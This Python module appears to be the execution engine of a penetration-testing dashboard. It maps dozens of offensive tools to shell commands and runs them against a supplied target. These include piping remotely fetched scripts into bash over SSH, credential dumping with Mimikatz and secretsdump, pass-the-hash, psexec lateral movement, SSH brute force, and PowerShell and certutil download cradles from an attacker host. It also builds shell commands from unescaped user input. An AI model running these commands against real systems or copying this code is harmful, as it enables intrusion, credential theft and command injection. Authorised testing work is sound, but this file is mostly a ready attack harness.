"""
tool_executor.py
Subprocess-based execution engine for PrivEsc / pentest tools.
Writes output to a temp log file; callers poll that file for streaming.
"""

import os
import signal
import subprocess
import threading
import uuid
from datetime import datetime
from typing import Optional


# ─────────────────────────────────────────────────────────────────────────────
# Tool command map
# Keys match tool names in privesc_tools.py exactly.
# Placeholders: {target} {ssh_auth} {hash_file} {wordlist} {query}
# Special values:
#   DEPLOY_WINDOWS  →  show copy-paste deployment guide for Windows targets
#   GUI_TOOL        →  launch GUI + show CLI equivalent
# ─────────────────────────────────────────────────────────────────────────────

TOOL_COMMANDS = {
    # ── Local scanners / attackers (run on Kali against target) ──────────────
    "nmap": "nmap -sV -sC -A {target} 2>&1",
    "Nikto": "nikto -h http://{target}/ 2>&1",
    "searchsploit (ExploitDB)": "searchsploit {query} 2>&1",
    "GTFOBins": "echo '[GTFOBins] Visit https://gtfobins.github.io — SUID/sudo/cron abuse reference'; "
                "echo 'Common SUID abusable binaries:'; "
                "find / -perm -4000 -type f 2>/dev/null | head -30",
    "LOLBAS":   "echo '[LOLBAS] Visit https://lolbas-project.github.io — Windows Living-off-the-Land reference'",
    "Trickest Privesc Database": "echo '[Trickest] Visit https://github.com/trickest/cve for PrivEsc CVE PoCs'",
    "Impacket":
        "echo '=== Impacket Tools ===' && impacket-secretsdump -no-pass {target} 2>&1 | head -60",
    "CrackMapExec / NetExec":
        "crackmapexec smb {target} 2>&1 || netexec smb {target} 2>&1",
    "Responder":
        "echo '[Responder] Requires root + active interface. Run manually:' && "
        "echo 'sudo responder -I eth0 -wPv' && "
        "echo '' && sudo responder -I eth0 -A 2>&1",
    "Hashcat":
        "hashcat --example-hashes 2>&1 | head -60",
    "John the Ripper":
        "john --list=formats 2>&1 | head -40",
    "Hydra":
        "hydra -L /usr/share/wordlists/metasploit/http_default_userpass.txt "
        "-e nsr {target} ssh 2>&1",
    "Pass-the-Hash tools":
        "impacket-psexec -hashes :{hash_file} Administrator@{target} 2>&1",
    "Pass-the-Ticket tools":
        "impacket-getTGT {target} -dc-ip {target} 2>&1 || "
        "echo 'Usage: impacket-getTGT <domain>/<user>:<password> -dc-ip <DC>'",
    "PingCastle":
        "echo '[PingCastle] Windows AD assessment tool - requires Windows host or wine' && "
        "echo 'Download: https://www.pingcastle.com/download/'",
    "ADExplorer":
        "echo '[ADExplorer] Sysinternals Windows tool - deploy to domain-joined host'",
    "PwnKit (CVE-2021-4034)":
        "echo '[PwnKit CVE-2021-4034] Polkit Local Privilege Escalation' && "
        "echo 'Check target: ssh {ssh_auth} {target} \"dpkg -l policykit-1 | grep -i version\"' && "
        "ssh {ssh_auth} {target} 'pkexec --version 2>&1 || echo Not found'",
    "DirtyCow (CVE-2016-5195)":
        "echo '[DirtyCow CVE-2016-5195] Kernel 2.6.22-4.8.3 privesc' && "
        "ssh {ssh_auth} {target} 'uname -r' 2>&1",
    "DirtyPipe (CVE-2022-0847)":
        "echo '[DirtyPipe CVE-2022-0847] Kernel 5.8-5.16.11 privesc' && "
        "ssh {ssh_auth} {target} 'uname -r' 2>&1",
    "Baron Samedit (CVE-2021-3156)":
        "echo '[Baron Samedit CVE-2021-3156] Sudo <1.9.5p2 heap overflow' && "
        "ssh {ssh_auth} {target} 'sudo --version' 2>&1",
    "GTFOBins automation scripts":
        "find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null",
    "SUID3NUM":
        "find / -perm -4000 -type f 2>/dev/null | while read f; do "
        "  bin=$(basename \"$f\"); "
        "  curl -s \"https://gtfobins.github.io/gtfobins/$bin/\" 2>/dev/null | grep -q 'SUID' "
        "  && echo \"[SUID EXPLOIT AVAILABLE] $f\" || echo \"[no exploit] $f\"; "
        "done 2>&1",
    "kube-hunter":
        "kube-hunter --remote {target} 2>&1 || "
        "docker run --rm aquasec/kube-hunter --remote {target} 2>&1",
    "kube-bench":
        "kube-bench 2>&1 | head -80 || "
        "docker run --rm aquasec/kube-bench 2>&1 | head -80",

    # ── Remote enumeration (SSH to target, run there) ─────────────────────────
    "LinPEAS":
        "ssh {ssh_auth} {target} "
        "'curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>&1' "
        "2>&1",
    "Linux Exploit Suggester":
        "ssh {ssh_auth} {target} "
        "'curl -sL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash 2>&1' "
        "2>&1",
    "Linux Exploit Suggester 2":
        "ssh {ssh_auth} {target} "
        "'curl -sL https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl | perl 2>&1' "
        "2>&1",
    "LinEnum":
        "ssh {ssh_auth} {target} "
        "'curl -sL https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash 2>&1' "
        "2>&1",
    "lse (Linux Smart Enumeration)":
        "ssh {ssh_auth} {target} "
        "'curl -sL https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | bash -s -- -l1 2>&1' "
        "2>&1",
    "BeRoot (Linux)":
        "ssh {ssh_auth} {target} "
        "'curl -sL https://raw.githubusercontent.com/AlessandroZ/BeRoot/master/Linux/beroot.py | python3 2>&1' "
        "2>&1",
    "Unix-Privesc-Check":
        "ssh {ssh_auth} {target} "
        "'curl -sL http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | "
        "tar xz && ./unix-privesc-check-1.4/unix-privesc-check standard 2>&1' "
        "2>&1",
    "linuxprivchecker":
        "ssh {ssh_auth} {target} "
        "'curl -sL https://raw.githubusercontent.com/linted/linuxprivchecker/master/linuxprivchecker.py | python3 2>&1' "
        "2>&1",
    "PEASS-ng":
        "ssh {ssh_auth} {target} "
        "'curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>&1' "
        "2>&1",
    "pspy (process monitoring)":
        "ssh {ssh_auth} {target} "
        "'curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy && "
        "chmod +x /tmp/pspy && timeout 30 /tmp/pspy 2>&1' 2>&1",
    "LaZagne":
        "ssh {ssh_auth} {target} "
        "'python3 -c \"import urllib.request,subprocess; "
        "exec(urllib.request.urlopen(\\\"https://raw.githubusercontent.com/AlessandroZ/LaZagne/master/Linux/laZagne.py\\\").read())\" 2>&1' "
        "2>&1",

    # ── AD / BloodHound ────────────────────────────────────────────────────────
    "BloodHound":
        "echo '[BloodHound] Starting Neo4j + BloodHound...' && "
        "sudo neo4j start 2>&1 && sleep 3 && bloodhound 2>/dev/null & "
        "echo '[BloodHound] Browser: http://localhost:7474 (neo4j/neo4j)' && "
        "echo '[SharpHound] Run on target: SharpHound.exe -c All --domain {target}'",
    "SharpHound":
        "echo '[SharpHound] Deploy to Windows target and run:' && "
        "echo 'SharpHound.exe -c All --ldapusername <user> --ldappassword <pass> --domain <domain>' && "
        "echo '' && "
        "echo '[Alt] BloodHound.py (run from Kali):' && "
        "python3 -m bloodhound -u {ssh_auth_user} -p {ssh_auth_pass} -d {target} -ns {target} -c all 2>&1 || "
        "echo 'Install: pip install bloodhound'",
    "PowerView":
        "echo '[PowerView] Import on Windows target with PowerShell:' && "
        "echo 'IEX(New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1\")' && "
        "echo '' && "
        "echo 'Common commands:' && "
        "echo '  Get-Domain, Get-DomainController, Get-DomainUser, Get-DomainComputer' && "
        "echo '  Invoke-ACLScanner, Find-LocalAdminAccess'",
    "Rubeus":
        "echo '[Rubeus] Windows Kerberos toolkit - deploy to target:' && "
        "echo 'Download: https://github.com/GhostPack/Rubeus' && "
        "echo '' && "
        "echo 'Common attacks via Impacket (from Kali):' && "
        "impacket-GetUserSPNs {target}/ -dc-ip {target} -no-pass 2>&1 | head -30 || "
        "echo 'Specify: impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC> -request'",
    "Certify":
        "echo '[Certify / Certipy] AD CS certificate abuse' && "
        "certipy find -dc-ip {target} -ns {target} -u {ssh_auth_user}@{target} -p {ssh_auth_pass} 2>&1 || "
        "echo 'Install: pip install certipy-ad'",
    "Kekeo":
        "echo '[Kekeo] Windows-only Kerberos tool - cannot run natively on Linux' && "
        "echo 'Alternative: use Impacket for Kerberos attacks' && "
        "impacket-getTGT {target}/ -dc-ip {target} 2>&1 | head -20",
    "ForgeCert":
        "echo '[ForgeCert] AD CS Golden Certificate attack' && "
        "echo 'Requires CA private key. Use Certipy as alternative:' && "
        "certipy forge -ca-pfx ca.pfx -upn administrator@{target} 2>&1 || "
        "echo 'certipy-ad not found. Install: pip install certipy-ad'",
    "Whisker":
        "echo '[Whisker] Shadow Credentials attack against AD objects' && "
        "echo 'Requires Outflank/Whisker on Windows. Kali alternative:' && "
        "python3 -c \"import subprocess; print('pywhisker: pip install pywhisker')\" && "
        "pywhisker -d {target} -u {ssh_auth_user} -p {ssh_auth_pass} --action list 2>&1 || "
        "echo 'Install: pip install pywhisker'",
    "Metasploit":
        "msfconsole -x 'db_nmap -sV -p 445,139,80,443,22,21 {target}; search type:exploit rank:excellent; exit' 2>&1",

    # ── Windows-only (show deployment guide) ──────────────────────────────────
    "WinPEAS": "DEPLOY_WINDOWS",
    "Seatbelt": "DEPLOY_WINDOWS",
    "PowerUp": "DEPLOY_WINDOWS",
    "PrivescCheck": "DEPLOY_WINDOWS",
    "SharpUp": "DEPLOY_WINDOWS",
    "BeRoot (Windows)": "DEPLOY_WINDOWS",
    "Windows Exploit Suggester": "DEPLOY_WINDOWS",
    "Watson": "DEPLOY_WINDOWS",
    "JAWS (Just Another Windows Script)": "DEPLOY_WINDOWS",
    "Incognito": "DEPLOY_WINDOWS",
    "RottenPotato": "DEPLOY_WINDOWS",
    "JuicyPotato": "DEPLOY_WINDOWS",
    "SweetPotato": "DEPLOY_WINDOWS",
    "PrintSpoofer": "DEPLOY_WINDOWS",
    "RoguePotato": "DEPLOY_WINDOWS",
    "GodPotato": "DEPLOY_WINDOWS",
    "Mimikatz": "DEPLOY_WINDOWS",
    "SafetyKatz": "DEPLOY_WINDOWS",
    "SharpKatz": "DEPLOY_WINDOWS",
    "LSASS Dumper": "DEPLOY_WINDOWS",
    "Nanodump": "DEPLOY_WINDOWS",
    "UACMe": "DEPLOY_WINDOWS",
    "SilentCleanup": "DEPLOY_WINDOWS",
    "fodhelper UAC bypass": "DEPLOY_WINDOWS",
    "eventvwr bypass": "DEPLOY_WINDOWS",
    "PowerUp (service abuse)": "DEPLOY_WINDOWS",
    "SharpSploit": "DEPLOY_WINDOWS",
    "DLL hijack automation tools": "DEPLOY_WINDOWS",
    "Sherlock": "DEPLOY_WINDOWS",
    "Windows Kernel Exploit Suggester": "DEPLOY_WINDOWS",
    "Mimikatz (Linux version)": "DEPLOY_WINDOWS",
    "KeeFarce": "DEPLOY_WINDOWS",
    # C2 / frameworks
    "Empire":    "echo '[Empire] Start: sudo python3 /opt/Empire/empire --rest'",
    "Covenant":  "echo '[Covenant] Start: cd /opt/Covenant && dotnet run'",
    "Sliver":    "echo '[Sliver] Start: sudo sliver-server'",
    "Cobalt Strike": "echo '[Cobalt Strike] Commercial C2 - requires license'",
    "Havoc C2":  "echo '[Havoc] Start: cd /opt/Havoc && ./havoc server --profile ./profiles/havoc.yaotl'",
    # Lateral movement (Kali-side tools)
    "PsExec":               "impacket-psexec {ssh_auth_user}:{ssh_auth_pass}@{target} 2>&1",
    "Impacket psexec.py":   "impacket-psexec {ssh_auth_user}:{ssh_auth_pass}@{target} 2>&1",
    "wmiexec.py":           "impacket-wmiexec {ssh_auth_user}:{ssh_auth_pass}@{target} 2>&1",
    "smbexec.py":           "impacket-smbexec {ssh_auth_user}:{ssh_auth_pass}@{target} 2>&1",
    "CrackMapExec":         "crackmapexec smb {target} -u {ssh_auth_user} -p {ssh_auth_pass} 2>&1",
    "atexec.py":            "impacket-atexec {ssh_auth_user}:{ssh_auth_pass}@{target} whoami 2>&1",
    "Chisel":               "echo '[Chisel] SOCKS5/HTTP tunnelling. Server: chisel server -p 8080 --reverse'",
    "Ligolo-ng":            "echo '[Ligolo-ng] Pivot tool. Server: ligolo-proxy -selfcert'",
    "SSH Key Reuse":        "ssh -F /opt/vuln_intel/app/.ssh_config -o BatchMode=yes {target} id 2>&1",
    "SSH Agent Hijacking":  "echo '[SSH Agent Hijacking]' && ls /tmp/ssh-* 2>/dev/null || echo 'No active SSH agents found'",
    "Cron Job Abuse":       "ssh {ssh_auth} {target} 'cat /etc/crontab; ls -la /etc/cron*; crontab -l' 2>&1",
    "NFS Mount Exploitation": "showmount -e {target} 2>&1",
    "Pacu (AWS escalation)": "pacu 2>&1 || echo 'Install: pip install pacu'",
    "Cloudsploit":          "echo '[Cloudsploit] Cloud security scanner: https://github.com/aquasecurity/cloudsploit'",
    "ScoutSuite":           "scout aws 2>&1 | head -30 || echo 'Install: pip install scoutsuite'",
    "CDK (Container Development Kit)": "cdk evaluate 2>&1 || docker run --rm cdkteam/cdk evaluate 2>&1",
    "deepce":               "bash <(curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh) 2>&1",
    "amicontained":         "docker run --rm r.j3ss.co/amicontained 2>&1",
    "kubectl-exec abuse":   "kubectl get pods -A 2>&1 | head -20",
    "Peirates":             "peirates 2>&1 || echo 'Install: go install github.com/inguardians/peirates@latest'",
}

# ─────────────────────────────────────────────────────────────────────────────
# Windows deployment guide generator
# ─────────────────────────────────────────────────────────────────────────────

_WINDOWS_DEPLOY_GUIDES = {
    "WinPEAS": (
        "WinPEAS — Windows Privilege Escalation Awesome Script\n"
        "═══════════════════════════════════════════════════════\n\n"
        "1. Download on Kali:\n"
        "   wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -O /tmp/winpeas.exe\n\n"
        "2. Upload to target (SMB):\n"
        "   impacket-smbclient {user}:{pass}@{target}\n"
        "   > use C$\n"
        "   > put /tmp/winpeas.exe Windows\\Temp\\winpeas.exe\n\n"
        "3. Execute via PSExec:\n"
        "   impacket-psexec {user}:{pass}@{target} 'C:\\Windows\\Temp\\winpeas.exe'\n\n"
        "4. Alternative (PowerShell download cradle):\n"
        "   [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12\n"
        "   IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/winpeas.ps1')"
    ),
    "Mimikatz": (
        "Mimikatz — Credential Extraction\n"
        "══════════════════════════════════\n\n"
        "1. Download on Kali:\n"
        "   wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip\n"
        "   unzip mimikatz_trunk.zip -d /tmp/mimikatz/\n\n"
        "2. Upload x64 binary:\n"
        "   impacket-smbclient {user}:{pass}@{target}\n"
        "   > put /tmp/mimikatz/x64/mimikatz.exe Windows\\Temp\\m.exe\n\n"
        "3. Run via PSExec (as SYSTEM):\n"
        "   impacket-psexec {user}:{pass}@{target} 'C:\\Windows\\Temp\\m.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit'\n\n"
        "4. Alternative — secretsdump from Kali (no upload needed):\n"
        "   impacket-secretsdump {user}:{pass}@{target}"
    ),
    "Seatbelt": (
        "Seatbelt — Windows Security Checks\n"
        "════════════════════════════════════\n\n"
        "1. Build from source or download:\n"
        "   https://github.com/GhostPack/Seatbelt/releases\n\n"
        "2. Upload & run:\n"
        "   impacket-smbclient {user}:{pass}@{target}\n"
        "   > put Seatbelt.exe Windows\\Temp\\sb.exe\n"
        "   impacket-psexec {user}:{pass}@{target} 'C:\\Windows\\Temp\\sb.exe -group=all'\n\n"
        "3. Key checks: TokenPrivileges, ProcessDotNet, LAPS, UAC, WCF, PSSession"
    ),
}

def _get_windows_guide(tool_name, target, user, passwd):
    """Return a formatted Windows deployment guide for a tool."""
    guide = _WINDOWS_DEPLOY_GUIDES.get(tool_name)
    if guide:
        return guide.format(user=user or "<user>", **{"pass": passwd or "<pass>"}, target=target or "<target>")
    # Generic guide for unlisted Windows tools
    safe = tool_name.replace(" ", "_").replace("/", "_").lower()
    return (
        f"{tool_name} — Windows Deployment Guide\n"
        "═══════════════════════════════════════════\n\n"
        f"This tool runs on Windows targets. To deploy:\n\n"
        f"1. Download / compile the binary for your target architecture.\n"
        f"   Search: https://github.com/search?q={safe}\n\n"
        f"2. Upload via SMB (impacket-smbclient) or HTTP server:\n"
        f"   python3 -m http.server 80  # serve from Kali\n"
        f"   # On target: certutil -urlcache -split -f http://KALI_IP/{safe}.exe\n\n"
        f"3. Execute remotely:\n"
        f"   impacket-psexec {user or '<user>'}:{passwd or '<pass>'}@{target or '<target>'} "
        f"'C:\\Windows\\Temp\\{safe}.exe'\n\n"
        f"4. Alternative — use CrackMapExec:\n"
        f"   crackmapexec smb {target or '<target>'} -u {user or '<user>'} "
        f"-p {passwd or '<pass>'} --exec-method smbexec -x '{safe}.exe'"
    )


# ─────────────────────────────────────────────────────────────────────────────
# Main executor
# ─────────────────────────────────────────────────────────────────────────────

# Global store: job_id → {process, log_path, tool, target, start_time}
_RUNNING_JOBS: dict = {}
_JOBS_LOCK = threading.Lock()

OUTPUT_DIR = "/tmp/privesc_jobs"
os.makedirs(OUTPUT_DIR, exist_ok=True)


def _build_command(tool_name: str, target: str, ssh_user: str, ssh_pass: str, wordlist: str) -> Optional[str]:
    """Resolve a command string for the tool, substituting placeholders."""
    cmd = TOOL_COMMANDS.get(tool_name)
    if not cmd:
        return None
    if cmd == "DEPLOY_WINDOWS":
        return None  # handled separately
    if cmd == "GUI_TOOL":
        return None

    _cfg = "/opt/vuln_intel/app/.ssh_config"
    ssh_auth = f"{ssh_user}@" if ssh_user else ""
    # Build sshpass prefix if password supplied
    if ssh_user and ssh_pass:
        ssh_prefix = f"sshpass -p '{ssh_pass}' "
        ssh_auth_full = f"-F {_cfg} {ssh_user}@"
    else:
        ssh_prefix = ""
        ssh_auth_full = f"-F {_cfg} {ssh_user}@" if ssh_user else f"-F {_cfg} "

    # Replace ssh {ssh_auth} with sshpass prefix
    cmd = cmd.replace("ssh {ssh_auth}", f"{ssh_prefix}ssh {ssh_auth_full}")

    if not target and any(x in cmd for x in ["ssh ", "nmap ", "nikto ", "crackmapexec ", "netexec ", "hydra ", "impacket"]):
        return "echo '[ERROR] No target IP set. Enter a target in the Target IP field above and try again.'"

    cmd = cmd.format(
        target=target or "localhost",
        ssh_auth=f"{ssh_prefix}-o StrictHostKeyChecking=no {ssh_user}@{target}" if ssh_user else f"-o StrictHostKeyChecking=no {target}",
        ssh_auth_user=ssh_user or "",
        ssh_auth_pass=ssh_pass or "",
        hash_file="/tmp/hashes.txt",
        wordlist=wordlist or "/usr/share/wordlists/rockyou.txt",
        query=tool_name,
    )
    return cmd


def execute_tool(tool_name: str, target: str = "",
                 ssh_user: str = "", ssh_pass: str = "",
                 wordlist: str = "") -> dict:
    """
    Launch a tool asynchronously.

    Returns dict:
        {job_id, log_path, tool, target, mode}
        or {error} if the tool doesn't exist.
    """
    # Handle Windows tools — no subprocess, just return guide text
    if TOOL_COMMANDS.get(tool_name) == "DEPLOY_WINDOWS":
        guide = _get_windows_guide(tool_name, target, ssh_user, ssh_pass)
        job_id = str(uuid.uuid4())[:8]
        log_path = os.path.join(OUTPUT_DIR, f"{job_id}.log")
        with open(log_path, "w") as f:
            f.write(guide)
        return {"job_id": job_id, "log_path": log_path, "tool": tool_name,
                "target": target, "mode": "guide", "pid": None}

    cmd = _build_command(tool_name, target, ssh_user, ssh_pass, wordlist)
    if not cmd:
        return {"error": f"Tool '{tool_name}' not found in command map."}

    job_id = str(uuid.uuid4())[:8]
    log_path = os.path.join(OUTPUT_DIR, f"{job_id}.log")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(log_path, "w") as f:
        f.write(f"[{ts}] Starting: {tool_name}\n")
        f.write(f"[{ts}] Target:   {target or '(local)'}\n")
        f.write(f"[{ts}] Command:  {cmd[:120]}{'...' if len(cmd) > 120 else ''}\n")
        f.write("─" * 60 + "\n\n")

    def _run():
        try:
            proc = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
                text=True, bufsize=1
            )
            with _JOBS_LOCK:
                if job_id in _RUNNING_JOBS:
                    _RUNNING_JOBS[job_id]["process"] = proc

            with open(log_path, "a") as f:
                for line in proc.stdout:
                    f.write(line)
                    f.flush()
            proc.wait()
            with open(log_path, "a") as f:
                status = "✅ COMPLETED" if proc.returncode == 0 else f"⚠ FINISHED (rc={proc.returncode})"
                f.write(f"\n\n{'─'*60}\n[{datetime.now().strftime('%H:%M:%S')}] {status}\n")
        except Exception as e:
            with open(log_path, "a") as f:
                f.write(f"\n[ERROR] {e}\n")

    job = {"job_id": job_id, "log_path": log_path, "tool": tool_name,
           "target": target, "mode": "exec", "pid": None, "process": None}
    with _JOBS_LOCK:
        _RUNNING_JOBS[job_id] = job

    t = threading.Thread(target=_run, daemon=True)
    t.start()

    return {"job_id": job_id, "log_path": log_path, "tool": tool_name,
            "target": target, "mode": "exec", "pid": None}


def get_output(log_path: str, max_chars: int = 8000) -> str:
    """Read the last `max_chars` of a job's log file."""
    try:
        with open(log_path, "r") as f:
            content = f.read()
        return content[-max_chars:] if len(content) > max_chars else content
    except Exception:
        return ""


def is_running(job_id: str) -> bool:
    """True if the job subprocess is still alive."""
    with _JOBS_LOCK:
        job = _RUNNING_JOBS.get(job_id)
    if not job:
        return False
    proc = job.get("process")
    if proc is None:
        return True  # Thread launched but hasn't stored the process yet
    return proc.poll() is None


def kill_job(job_id: str) -> bool:
    """Send SIGTERM to the running job. Returns True if killed."""
    with _JOBS_LOCK:
        job = _RUNNING_JOBS.pop(job_id, None)
    if not job:
        return False
    proc = job.get("process")
    if proc and proc.poll() is None:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception:
            proc.terminate()
    return True
